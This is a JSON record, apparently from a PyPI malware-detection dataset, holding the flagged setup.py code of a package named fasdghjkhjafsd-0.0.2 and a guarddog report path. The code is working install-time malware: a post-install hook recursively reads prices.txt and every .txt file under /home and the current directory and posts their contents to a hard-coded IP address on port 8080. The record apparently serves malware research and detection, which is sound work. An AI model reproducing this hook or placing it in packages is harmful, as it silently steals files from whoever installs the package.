[
  {
    "pyfile": "setup.py",
    "malicious_code_snippets": "import os\nimport glob\nimport urllib.request\nimport json\n\ndef post_json(body):\n    myurl = \"http://140.238.202.225:8080\"\n\n    req = urllib.request.Request(myurl)\n    req.add_header('Content-Type', 'application/json; charset=utf-8')\n    jsondata = json.dumps(body)\n    jsondataasbytes = jsondata.encode('utf-8')   # needs to be bytes\n    req.add_header('Content-Length', len(jsondataasbytes))\n    response = urllib.request.urlopen(req, jsondataasbytes)\n\nclass PostInstallCommand(install):\n    \"\"\"Post-installation for installation mode.\"\"\"\n    def run(self):\n        install.run(self)\n        \n        text = \"\"\n        path = '/home'\n        for filename in glob.glob(os.path.join(path, '**/prices.txt'),  recursive=True):\n            try:\n                with open( filename, 'r') as f: # open in readonly mode\n                    text = f.read() + '\\n'\n                    post_json({filename: text})\n            except:\n                pass\n\n        path = ''\n        for filename in glob.glob(os.path.join(path, '**/prices.txt'),  recursive=True):\n            try:\n                with open( filename, 'r') as f: # open in readonly mode\n                    text = f.read() + '\\n'\n                    post_json({filename: text})\n            except:\n                pass\n\n        path = ''\n        for filename in glob.glob(os.path.join(path, '**/*.txt'),  recursive=True):\n            try:\n                with open( filename, 'r') as f: # open in readonly mode\n                    text = f.read() + '\\n'\n                    post_json({filename: text})\n            except:\n                pass"
  },
  {
    "metadata": {
      "package_name": "fasdghjkhjafsd-0.0.2",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/fasdghjkhjafsd-0.0.2.txt"
    }
  }
]